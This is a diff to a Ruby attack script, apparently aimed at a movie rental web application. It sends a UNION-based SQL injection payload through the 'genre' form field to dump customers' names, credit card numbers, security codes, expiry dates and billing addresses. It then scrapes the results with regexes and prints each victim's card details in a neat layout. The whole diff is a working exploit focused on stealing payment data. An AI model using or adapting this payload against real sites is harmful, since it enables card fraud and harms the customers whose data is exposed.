@@ -32,7 +32,7 @@ else
 end
 
 
-egg = "' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"
+egg = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"
 
 body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
 	   "genre=" + CGI::escape(egg) + "&" \
@@ -58,8 +58,15 @@ response2 = s2.read
 customer_info = []
 
 regex_cc = /<td><a href="\/movies\/rent\/0">([0-9]*)<\/a><\/td>/
-regex = /<td><a href="\/movies\/rent\/0">([0-9]*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/
+regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/
 
 response2.scan(regex) {|e| customer_info << e}
 
-puts customer_info.to_s
+customer_info.each_with_index do |customer, i|
+	puts "Customer #" + i.to_s + "\n"
+	puts "Name:\t\t\t" + customer[0]
+	puts "Credit Card Number:\t" + customer[1]
+	puts "Expiration date:\t" + customer[2] + "/" + customer[3]
+	puts "3-digit security code:\t" + customer[4] + "\n\n"
+end
+
